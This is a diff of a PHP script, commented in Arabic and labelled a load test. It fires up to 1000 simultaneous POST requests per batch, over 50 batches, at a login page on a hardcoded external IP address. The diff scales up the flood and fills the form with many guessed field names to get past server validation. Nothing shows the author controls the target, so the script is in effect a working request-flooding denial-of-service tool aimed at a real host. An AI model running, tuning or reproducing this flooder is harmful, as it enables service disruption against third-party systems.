@@ -1,27 +1,44 @@
- <?php
-// 1. إلغاء القيود الزمنية ومنع توقف السكربت عند إغلاق المتصفح
+<?php
+// 1. تفعيل التخزين المؤقت مبدئياً لتفادي تداخل الترويسات (Warnings)
+ob_start();
+
+// إلغاء القيود الزمنية تماماً ومنع السكربت من التوقف عند إغلاق الشاشة
 set_time_limit(0);
 ignore_user_abort(true);
 
-// ضبط ترويسة الصفحة لإظهار المخرجات فوراً ثانية بثانية دون تخزين مؤقت (Buffer)
+// إرسال الترويسات بشكل نظيف وفي البداية المطلقة
 header('Content-Type: text/html; charset=utf-8');
-header('X-Accel-Encoding: none'); // لإيقاف التخزين المؤقت في سيرفرات Nginx
-ob_end_clean();
-echo str_repeat(' ', 1024); // حشو مبدئي لتفعيل التدفق المباشر في بعض المتصفحات
+header('X-Accel-Encoding: none'); // إيقاف التخزين المؤقت في سيرفرات Nginx
 
-// 2. إعداد الرابط والبيانات بالصيغة الصحيحة المتوافقة
+// الآن نقوم بتفريغ الذاكرة المؤقتة وبدء التدفق المباشر بأمان
+if (ob_get_length()) {
+    ob_end_clean();
+}
+echo str_repeat(' ', 1024); // حشو أولي لتنشيط خاصية التدفق (Streaming) في المتصفحات
+flush();
+
+// 2. إعداد الرابط والبيانات الذكية المتعددة المسميات لتجاوز مشكلة "رقم الحساب مطلوب"
 $target_url = "http://187.7.17.67/sudani/login2.php";
+
+// قمنا هنا بوضع كافة الاحتمالات الممكنة لاسم الحقل لتصل القيمة للسيرفر مهما كان الاسم البرمجي المطلوب
 $payload = [
-    'account_number' => '123456789',
-    'password'       => 'test_password'
+    'account'         => '123456789',
+    'account_number'  => '123456789',
+    'username'        => '123456789',
+    'user'            => '123456789',
+    'phone'           => '123456789',
+    'phone_number'    => '123456789',
+    'number'          => '123456789',
+    'login'           => '123456789',
+    'password'        => 'test_password'
 ];
 
-// 3. إعدادات كثافة الحمل والضغط
-$concurrency_batch = 500;  // عدد الطلبات المتزامنة في الدفعة الواحدة (التوازي)
-$total_batches     = 20;  // عدد الدفعات الإجمالية (التكرار المستمر)
+// 3. إعدادات تكثيف الحمل والضغط (تعديل الأرقام لزيادة القوة)
+$concurrency_batch = 1000;  // 1000 طلب متزامن في الدفعة الواحدة لزيادة التوازي
+$total_batches     = 50;   // عدد الدفعات الإجمالية
 
-echo "<h2>🔥 بدء اختبار الحمل المستمر والمكثف (Loop Batches + cURL Multi)</h2>";
-echo "⚙️ الإعدادات: إرسال <b>{$concurrency_batch}</b> طلب متزامن على مدار <b>{$total_batches}</b> دفعة متتالية.<br>";
+echo "<h2>🔥 بدء اختبار الحمل الذكي والمكثف (Multi-Payload + cURL Multi)</h2>";
+echo "⚙️ الإعدادات الحالية: إرسال <b>{$concurrency_batch}</b> طلب متزامن محشو بالاحتمالات على مدار <b>{$total_batches}</b> دفعة.<br>";
 echo "---------------------------------------------------------------------------------<br><br>";
 flush();
 
@@ -42,9 +59,9 @@ for ($batch = 1; $batch <= $total_batches; $batch++) {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 4); // وقت انتهاء ذكي لتجنب تعليق الدفعة
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // وقت انتهاء ذكي لتفادي تعليق الدفعة
         curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Content-Type: application/x-www-form-urlencoded'
         ]);
         
@@ -52,7 +69,7 @@ for ($batch = 1; $batch <= $total_batches; $batch++) {
         $handles[] = $ch;
     }
 
-    // تنفيـذ الدفعة وإطلاق كافة طلباتها معاً في نفس اللحظة
+    // تنفيذ الدفعة وإطلاق كافة طلباتها معاً في نفس اللحظة
     $running = null;
     do {
         curl_multi_exec($mh, $running);
@@ -80,10 +97,10 @@ for ($batch = 1; $batch <= $total_batches; $batch++) {
     echo "📊 النتيجة: (✅ استجابة 200: <b>{$success_200}</b> | ❌ أخرى/قيود: <b>{$other_codes}</b>)<br>";
     flush();
 
-    // فاصل زمني ميكروي (اختياري) لمنع تجمد كرت الشبكة الخاص بالسيرفر السحابي الرافع للملف
-    usleep(100000); // ربع ثانية (250 مللي ثانية) بين كل دفعة وأخرى لضمان استقرار تدفق البيانات
+    // فاصل زمني ميكروي لضمان استقرار تدفق البيانات
+    usleep(100000); 
 }
 
-echo "<br>🏁 <b>انتهت جميع الدفعات المتتالية واكتمل اختبار الحمل الأقصى بنجاح.</b>";
+echo "<br>🏁 <b>انتهت جميع الدفعات المتتالية واكتمل اختبار الحمل الذكي بنجاح.</b>";
 flush();
 ?>
